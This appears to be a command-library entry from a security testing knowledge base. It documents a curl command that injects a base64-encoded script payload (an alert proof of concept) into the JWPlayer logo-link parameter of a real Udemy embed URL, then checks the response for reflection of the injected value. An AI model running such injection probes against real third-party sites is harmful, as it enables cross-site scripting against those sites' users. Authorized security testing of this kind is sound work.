---
id: cmd-curl-test-embed
data: >-
  curl -s
  "https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][logo][link]=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="
  | grep -i logo
tags:
  - web
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:15:31.601Z'
verified: false
validated: true
submitted: true
---
# curl-test-embed-url

## Command

```bash
curl -s "https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][logo][link]=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=" | grep -i logo
```

## Description

This command uses curl to fetch a malicious Udemy embed URL and grep to check if the injected logo.link parameter appears in the response, verifying parameter acceptance without execution (since curl doesn't run JS).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| URL argument | The full embed URL with params | Yes |
| `| grep -i logo` | Pipe to grep for case-insensitive search of 'logo' in output | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][logo][link]=test" | grep -i logo
```

### Advanced Usage

```bash
curl -s -v "https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][logo][link]=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=" | grep -i "logo.link"
```

## Expected Output

Lines containing 'logo' from the JWPlayer config in the HTML/JS response, e.g., 'logo: {link: "data:text/html;base64,..."}', confirming injection.

## Related

- [[Related Procedure: Craft-Malicious-JWPlayer-Logo-Parameters]]
